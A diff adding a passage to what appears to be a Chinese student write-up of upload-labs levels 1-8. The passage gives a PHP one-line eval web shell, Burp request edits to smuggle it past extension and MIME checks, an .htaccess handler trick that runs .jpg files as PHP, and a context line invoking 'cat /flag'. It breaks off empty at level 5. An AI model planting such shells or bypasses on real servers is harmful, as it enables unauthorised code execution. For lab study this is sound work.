@@ -177,3 +177,77 @@ http://<实例域名>/?file=/tmp/shell&a=cat%20/flag
 
 **回显被包裹不影响判断**：`config-create` 写出的文件本身是 PEAR 序列化配置，命令输出嵌在字段值里，看到根目录列表里有 `flag` 就说明已经 RCE。
 
+## 3.upload-lab.1-8
+
+#### emm应该是这样写的吧（）
+
+##### 1).前端绕过
+
+用记事本写文件，改文件名为`.jpg`的（因为<img src="/img/posts/2026-11-16-rugular-meeting-4/img-09.png" alt="image-20261119005857127" style="zoom: 67%;" />）
+
+内容是一句话木马
+
+```
+<?php @eval($_POST['pass']); ?>
+```
+
+`$_POST['pass']`接收 HTTP POST 里名为 `pass` 的参数，**原样当代码传给 eval**
+
+| 维度            | GET                                    | POST     |
+| --------------- | -------------------------------------- | -------- |
+| 数据位置        | URL 里                                 | 请求体里 |
+| 长度限制        | 有，约 2~8KB                           | 基本无   |
+| 是否进访问日志  | **会**，`?1=system('whoami')` 原样记录 | 不记录   |
+| 浏览器历史/收藏 | 会留下                                 | 不会     |
+| 缓存、重复请求  | 可被缓存                               | 不缓存   |
+| 特殊字符        | 要 URL 编码（`&`→`%26`）               | 一般不用 |
+
+打开bp，抓包，把 `filename="shell.jpg"` 改成 `filename="shell.php"`，放行
+
+##### 2).MIME绕过
+
+根据提示<img src="/img/posts/2026-11-16-rugular-meeting-4/img-10.png" alt="屏幕截图 2026-11-19 104049" style="zoom:67%;" />，查看代码发现
+
+```PHP
+if ($_FILES["file"]["type"] == "image/jpeg") { ... }
+```
+
+只需上传抓包，把 `Content-Type: application/octet-stream` 换成 `image/jpeg`，就可以绕过检测
+
+##### 3)后缀名绕过，用`.php3`那些黑名单漏掉的
+
+##### 4).htaccess 解析漏洞
+
+没办法上传 `.php` 文件。准备一个文件，文件名就是 `.htaccess`，
+
+内容（这里因为直接用的是例会里的代码但是好像出问题了，就去问dsh她说**因为我机器上装的是 NTS 版 PHP，它根本不提供 Apache 模块 DLL，只能跑成独立进程**）
+
+```
+AddHandler fcgid-script .jpg
+FcgidWrapper "D:/phpstudy_pro/Extensions/php/php5.6.9nts/php-cgi.exe" .jpg
+```
+
+因为我已经写了一个内容为一句话木马，格式为`.jpg`的文件，直接上传后，再访问`/upload/文件名.jpg`
+
+##### 5).
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
